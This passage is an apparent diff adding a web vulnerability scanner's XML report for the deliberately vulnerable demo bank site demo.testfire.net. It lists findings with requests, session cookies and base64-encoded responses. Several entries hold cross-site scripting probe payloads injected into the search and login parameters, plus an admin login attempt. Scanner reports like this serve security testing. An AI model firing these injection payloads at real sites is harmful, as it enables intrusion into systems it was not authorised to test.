+bHRzPC9oMT4NCg0KPHA+Tm8gcmVzdWx0cyB3ZXJlIGZvdW5kIGZvciB0aGUgcXVlcnk6PGJyIC8+
+PGJyIC8+DQo8c3BhbiBpZD0iX2N0bDBfX2N0bDBfQ29udGVudF9NYWluX2xibFNlYXJjaCI+Iic+
+PHFzcyBgOyEtLT0meygpfT48L3NwYW4+PC9wPg0KDQo8L2Rpdj4NCg0KDQogICAgPC90ZD4NCiAg
+PC90cj4NCjwvdGFibGU+DQoNCg0KPC9kaXY+DQoNCjxkaXYgaWQ9ImZvb3RlciIgc3R5bGU9Indp
+ZHRoOiA5OSU7Ij4NCiAgICA8YSBpZD0iX2N0bDBfX2N0bDBfSHlwZXJMaW5rNSIgaHJlZj0iZGVm
+YXVsdC5hc3B4P2NvbnRlbnQ9cHJpdmFjeS5odG0iPlByaXZhY3kgUG9saWN5PC9hPg0KICAgICZu
+YnNwOyZuYnNwO3wmbmJzcDsmbmJzcDsNCiAgICA8YQ==
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[PHFzcyBgOyEtLT0meygpfT4=
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034769</ID>
+                <DETECTION_ID>4293588</DETECTION_ID>
+                <QID>150081</QID>
+                <URL>http://demo.testfire.net/bank/servererror.aspx</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/servererror.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZWl0aGVyIGRpZCBub3QgaGF2ZSBhbiAiWC1G
+UkFNRS1PUFRJT05TIiBoZWFkZXIgcHJlc2VudCBvciB3YXMgbm90IHNldCB0byBERU5ZIG9yIFNB
+TUVPUklHSU4K
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034768</ID>
+                <DETECTION_ID>4293587</DETECTION_ID>
+                <QID>150081</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZWl0aGVyIGRpZCBub3QgaGF2ZSBhbiAiWC1G
+UkFNRS1PUFRJT05TIiBoZWFkZXIgcHJlc2VudCBvciB3YXMgbm90IHNldCB0byBERU5ZIG9yIFNB
+TUVPUklHSU4K
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034778</ID>
+                <DETECTION_ID>4293597</DETECTION_ID>
+                <QID>150081</QID>
+                <URL>http://demo.testfire.net/bank/ws.asmx</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/ws.asmx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZWl0aGVyIGRpZCBub3QgaGF2ZSBhbiAiWC1G
+UkFNRS1PUFRJT05TIiBoZWFkZXIgcHJlc2VudCBvciB3YXMgbm90IHNldCB0byBERU5ZIG9yIFNB
+TUVPUklHSU4K
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034751</ID>
+                <DETECTION_ID>4293570</DETECTION_ID>
+                <QID>150081</QID>
+                <URL>http://demo.testfire.net/</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VGhlIHJlc3BvbnNlIGZvciB0aGlzIHJlcXVlc3QgZWl0aGVyIGRpZCBub3QgaGF2ZSBhbiAiWC1G
+UkFNRS1PUFRJT05TIiBoZWFkZXIgcHJlc2VudCBvciB3YXMgbm90IHNldCB0byBERU5ZIG9yIFNB
+TUVPUklHSU4K
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034760</ID>
+                <DETECTION_ID>4293579</DETECTION_ID>
+                <QID>150001</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <PARAM>uid</PARAM>
+                <FORM_ENTRY_POINT>http://demo.testfire.net/bank/login.aspx</FORM_ENTRY_POINT>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>"%20onEvent=@REQUESTID@%20</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogClJlc3BvbnNlIGNvbnRlbnQtdHlwZTogdGV4dC9odG1sCgphbj48L3A+DQoNCjxm
+b3JtIGFjdGlvbj0ibG9naW4uYXNweCIgbWV0aG9kPSJwb3N0IiBuYW1lPSJsb2dpbiIgaWQ9Imxv
+Z2luIiBvbnN1Ym1pdD0icmV0dXJuIChjb25maXJtaW5wdXQobG9naW4pKTsiPg0KICA8dGFibGU+
+DQogICAgPHRyPg0KICAgICAgPHRkPg0KICAgICAgICBVc2VybmFtZToNCiAgICAgIDwvdGQ+DQog
+ICAgICA8dGQ+DQogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0idWlkIiBuYW1lPSJ1aWQi
+IHZhbHVlPSIiIG9uRXZlbnQ9WDE1OTkyMTM4OFkxWiAiIHN0eWxlPSJ3aWR0aDogMTUwcHg7Ij4N
+CiAgICAgIDwvdGQ+DQogICAgICA8dGQ+DQogICAgICA8L3RkPg0KICAgIDwvdHI+DQogICAgPHRy
+Pg0KICAgICAgPHRkPg0KICAgICAgICBQYXNzd29yZDoNCiAgICAgIDwvdGQ+DQogICAgICA8dGQ+
+DQogICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InBhc3N3IiBuYW1lPSJwYXNzdyIg
+c3R5bGU9IndpZHRoOiAxNTBweDsiPg0KICAgICAgIA==
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[PGlucHV0IHR5cGU9InRleHQiIGlkPSJ1aWQiIG5hbWU9InVpZCIgdmFsdWU9IiIgb25FdmVudD1Y
+MTU5OTIxMzg4WTFaICIgc3R5bGU9IndpZHRoOiAxNTBweDsiPg==
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034752</ID>
+                <DETECTION_ID>4293571</DETECTION_ID>
+                <QID>150123</QID>
+                <URL>http://demo.testfire.net/bank/customize.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/customize.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[bGFuZz07IHBhdGg9LzsgZG9tYWluPWRlbW8udGVzdGZpcmUubmV0
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034748</ID>
+                <DETECTION_ID>4293567</DETECTION_ID>
+                <QID>150059</QID>
+                <URL>http://demo.testfire.net/comment.aspx</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                    <URL>http://demo.testfire.net/feedback.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/comment.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[YzpcZG93bmxvYWRzXEFsdG9yb011dHVhbF92Nlx3ZWJzaXRlXGNvbW1lbnQuYXNweC5jcw==
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034756</ID>
+                <DETECTION_ID>4293575</DETECTION_ID>
+                <QID>150049</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <FORM_ENTRY_POINT>http://demo.testfire.net/bank/login.aspx</FORM_ENTRY_POINT>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD><![CDATA[uid=admin&passw=a****&btnSubmit=Login]]></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VXNlcm5hbWU6IGFkbWluClBhc3N3b3JkOiBhKioqKg==
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034770</ID>
+                <DETECTION_ID>4293589</DETECTION_ID>
+                <QID>150085</QID>
+                <URL>http://demo.testfire.net/search.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/search.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[VnVsbmVyYWJsZSB0byBzbG93IEhUVFAgUE9TVCBhdHRhY2sKCUNvbm5lY3Rpb24gd2l0aCBwYXJ0
+aWFsIFBPU1QgYm9keSByZW1haW5lZCBvcGVuIGZvcjogMTI5NjA2IG1pbGxpc2Vjb25kcw==
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034761</ID>
+                <DETECTION_ID>4293580</DETECTION_ID>
+                <QID>150053</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogUGFyZW50IFVSTCBvZiBMb2dpbiBGb3JtIGlzIDogaHR0cDovL2RlbW8udGVzdGZp
+cmUubmV0L2JhbmsvbG9naW4uYXNweApMb2dpbiBGb3JtIElzIE5vdCBTdWJtaXR0ZWQgVmlhIEhU
+VFBTCg==
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034742</ID>
+                <DETECTION_ID>4293561</DETECTION_ID>
+                <QID>150059</QID>
+                <URL>http://demo.testfire.net/default.aspx?content=personal_savings.htm</URL>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                    <URL>http://demo.testfire.net/search.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/default.aspx?content=personal_savings.htm</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[QzpcZG93bmxvYWRzXEFsdG9yb011dHVhbF92Nlx3ZWJzaXRlXHN0YXRpY1xwZXJzb25hbF9zYXZp
+bmdzLmh0bQ==
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034780</ID>
+                <DETECTION_ID>4293599</DETECTION_ID>
+                <QID>150013</QID>
+                <URL>http://demo.testfire.net/search.aspx</URL>
+                <PARAM>txtSearch</PARAM>
+                <FORM_ENTRY_POINT>http://demo.testfire.net/bank/login.aspx</FORM_ENTRY_POINT>
+                <ACCESS_PATH>
+                    <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                </ACCESS_PATH>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>txtSearch=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/search.aspx?txtSearch=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogClJlc3BvbnNlIGNvbnRlbnQtdHlwZTogdGV4dC9odG1sCgpsPg0KICAgIDwvdGQ+
+DQogICAgPHRkIHZhbGlnbj0idG9wIiBjb2xzcGFuPSIzIiBjbGFzcz0iYmIiPg0KDQoNCjxkaXYg
+Y2xhc3M9ImZsIiBzdHlsZT0id2lkdGg6IDk5JTsiPg0KDQo8aDE+U2VhcmNoIFJlc3VsdHM8L2gx
+Pg0KDQo8cD5ObyByZXN1bHRzIHdlcmUgZm91bmQgZm9yIHRoZSBxdWVyeTo8YnIgLz48YnIgLz4N
+CjxzcGFuIGlkPSJfY3RsMF9fY3RsMF9Db250ZW50X01haW5fbGJsU2VhcmNoIj48c2NyaXB0IHNy
+Yz1odHRwOi8vbG9jYWxob3N0L2ogPC9zcGFuPjwvcD4NCg0KPC9kaXY+DQoNCg0KICAgIDwvdGQ+
+DQogIDwvdHI+DQo8L3RhYmxlPg0KDQoNCjwvZGl2Pg0KDQo8ZGl2IGlkPSJmb290ZXIiIHN0eWxl
+PSJ3aWR0aDogOTklOyI+DQogICAgPGEgaWQ9Il9jdGwwX19jdGwwX0h5cGVyTGluazUiIGhyZWY9
+ImRlZmF1bHQuYXNweD9jb250ZW50PXByaXZhY3kuaHRtIj5Qcml2YWN5IFBvbGljeTwvYT4NCiAg
+ICAmbmJzcDsmbmJzcDt8Jm5ic3A7Jm5ic3A7DQogIA==
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[PHNjcmlwdCBzcmM9aHR0cDovL2xvY2FsaG9zdC9qIDwvc3Bhbj4=
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034763</ID>
+                <DETECTION_ID>4293582</DETECTION_ID>
+                <QID>150123</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD>N/A</PAYLOAD>
+                        <REQUEST>
+                            <METHOD>GET</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS/>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[YW1TZXNzaW9uSWQ9MTMyMjcxODk5MTAwOyBwYXRoPS87IGRvbWFpbj1kZW1vLnRlc3RmaXJlLm5l
+dA==
+]]></CONTENTS>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034759</ID>
+                <DETECTION_ID>4293578</DETECTION_ID>
+                <QID>150084</QID>
+                <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                <PARAM>uid</PARAM>
+                <FORM_ENTRY_POINT>http://demo.testfire.net/bank/login.aspx</FORM_ENTRY_POINT>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
+                <FIRST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</FIRST_TIME_DETECTED>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <LAST_TIME_TESTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_TESTED>
+                <TIMES_DETECTED>1</TIMES_DETECTED>
+                <PAYLOADS>
+                    <PAYLOAD>
+                        <NUM>1</NUM>
+                        <PAYLOAD><![CDATA[uid=%3Cscript%20%3D%22%3E%22%20SRC%3D%2F%2Flocalhost%2Fj%3E&passw=password&btnSubmit=Login]]></PAYLOAD>
+                        <REQUEST>
+                            <METHOD>POST</METHOD>
+                            <URL>http://demo.testfire.net/bank/login.aspx</URL>
+                            <HEADERS>
+                                <HEADER>
+                                    <key>Referer</key>
+                                    <value><![CDATA[ http://demo.testfire.net/bank/login.aspx]]></value>
+                                </HEADER>
+                                <HEADER>
+                                    <key>Cookie</key>
+                                    <value><![CDATA[ lang=; amSessionId=132271899100; ASP.NET_SessionId=tskomp45ivi55r4530tp5g2a;]]></value>
+                                </HEADER>
+                            </HEADERS>
+                        </REQUEST>
+                        <RESPONSE>
+                            <CONTENTS base64="true"><![CDATA[Y29tbWVudDogQSBzaWduaWZpY2FudCBwb3J0aW9uIG9mIHRoZSBYU1MgdGVzdCBwYXlsb2FkIGFw
+cGVhcmVkIGluIHRoZSB3ZWIgcGFnZSwgYnV0IHRoZSBwYWdlJ3MgRE9NIHdhcyBub3QgbW9kaWZp
+ZWQgYXMgZXhwZWN0ZWQgZm9yIGEgc3VjY2Vzc2Z1bCBleHBsb2l0LiBUaGlzIHJlc3VsdCBzaG91
+bGQgYmUgbWFudWFsbHkgdmVyaWZpZWQgdG8gZGV0ZXJtaW5lIGl0cyBhY2N1cmFjeS4KClJlc3Bv
+bnNlIGNvbnRlbnQtdHlwZTogdGV4dC9odG1sCgptIGFjdGlvbj0ibG9naW4uYXNweCIgbWV0aG9k
+PSJwb3N0IiBuYW1lPSJsb2dpbiIgaWQ9ImxvZ2luIiBvbnN1Ym1pdD0icmV0dXJuIChjb25maXJt
+aW5wdXQobG9naW4pKTsiPg0KICA8dGFibGU+DQogICAgPHRyPg0KICAgICAgPHRkPg0KICAgICAg
+ICBVc2VybmFtZToNCiAgICAgIDwvdGQ+DQogICAgICA8dGQ+DQogICAgICAgIDxpbnB1dCB0eXBl
+PSJ0ZXh0IiBpZD0idWlkIiBuYW1lPSJ1aWQiIHZhbHVlPSI8c2NyaXB0ID0iPiIgU1JDPS8vbG9j
+YWxob3N0L2o+IiBzdHlsZT0id2lkdGg6IDE1MHB4OyI+DQogICAgICA8L3RkPg0KICAgICAgPHRk
+Pg0KICAgICAgPC90ZD4NCiAgICA8L3RyPg0KICAgIDx0cj4NCiAgICAgIDx0ZD4NCiAgICAgICAg
+UGFzc3dvcmQ6DQogICAgICA8L3RkPg0KICAgICAgPHRkPg0KICAgICAgICA8aW5wdXQgdHlwZT0i
+cGFzc3dvcmQiIGlkPSJwYXNzdyIgbmFtZT0icGFzc3ciIHN0eWxlPSJ3aWR0aDogMTUwcHg7Ij4N
+CiAgICAgICAgPC90ZD4NCg==
+]]></CONTENTS>
+                            <EVIDENCE base64="true"><![CDATA[PHNjcmlwdCA9Ij4iIFNSQz0vL2xvY2FsaG9zdC9qPg==
+]]></EVIDENCE>
+                        </RESPONSE>
+                    </PAYLOAD>
+                </PAYLOADS>
+                <IGNORED>false</IGNORED>
+            </VULNERABILITY>
+            <VULNERABILITY>
+                <ID>245034744</ID>
+                <DETECTION_ID>4293563</DETECTION_ID>
+                <QID>150093</QID>
+                <URL>http://demo.testfire.net/bank/ws.asmx?wsdl</URL>
+                <PARAM>UserId</PARAM>
+                <FUNCTION>IsValidUser</FUNCTION>
+                <FORM_ENTRY_POINT>true</FORM_ENTRY_POINT>
+                <AJAX>false</AJAX>
+                <AUTHENTICATION>Not Required</AUTHENTICATION>
